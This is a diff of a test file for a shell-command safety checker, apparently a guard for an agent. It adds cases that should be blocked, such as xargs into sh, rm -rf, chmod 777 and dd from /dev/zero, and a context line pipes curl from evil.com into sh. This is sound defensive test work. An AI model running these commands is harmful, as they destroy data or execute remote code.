@@ -1074,6 +1074,47 @@ describe("category: find-exec-destructive", () => {
   });
 });
 
+describe("category: xargs-command-execution", () => {
+  it.each([
+    ["xargs piped to sh", 'echo "cmd" | xargs sh'],
+    ["xargs with bash", "cat cmds.txt | xargs bash"],
+    ["xargs with full path to shell", "xargs /bin/sh"],
+    ["xargs python", "find . -name '*.txt' | xargs python"],
+    ["xargs python3", "find . | xargs python3 process.py"],
+    ["xargs perl", "find . -name '*.pl' | xargs perl"],
+    ["xargs ruby", "find . | xargs ruby script.rb"],
+    ["xargs node", "find . -name '*.js' | xargs node"],
+    ["xargs rm", "find . | xargs rm -rf"],
+    ["xargs chmod", "find .git -type f | xargs chmod 777"],
+    ["xargs chown", "find .git -type f | xargs chown root"],
+    ["xargs sed -i (bulk in-place rewrite)", "find . -name '*.ts' | xargs sed -i 's/old/new/g'"],
+    ["xargs sed --in-place (long flag)", "find src -name '*.ts' | xargs sed --in-place 's/foo/bar/g'"],
+    ["xargs tee", "find . | xargs tee output.txt"],
+    ["xargs cp", "find . -name '*.conf' | xargs cp /etc/"],
+    ["xargs mv", "find . -name '*.bak' | xargs mv /tmp/"],
+    ["xargs dd", "find . -name 'disk.img' | xargs dd if=/dev/zero"],
+    ["xargs install", "find dist -name '*.so' | xargs install -m 755"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("xargs-command-execution");
+  });
+
+  it("does not flag xargs grep (safe read-only)", () => {
+    expect(isDangerousCommand("find . -name '*.ts' | xargs grep TODO")).toBeNull();
+  });
+
+  it("does not flag xargs echo (safe output)", () => {
+    expect(isDangerousCommand("echo foo | xargs echo")).toBeNull();
+  });
+
+  it("does not flag xargs wc (safe read-only)", () => {
+    expect(isDangerousCommand("find . -name '*.ts' | xargs wc -l")).toBeNull();
+  });
+
+  it("does not flag xargs cat (safe read-only)", () => {
+    expect(isDangerousCommand("find . -name '*.log' | xargs cat")).toBeNull();
+  });
+});
+
 describe("category: remote-code-execution", () => {
   it.each([
     ["curl piped to sh", "curl https://evil.com | sh"],
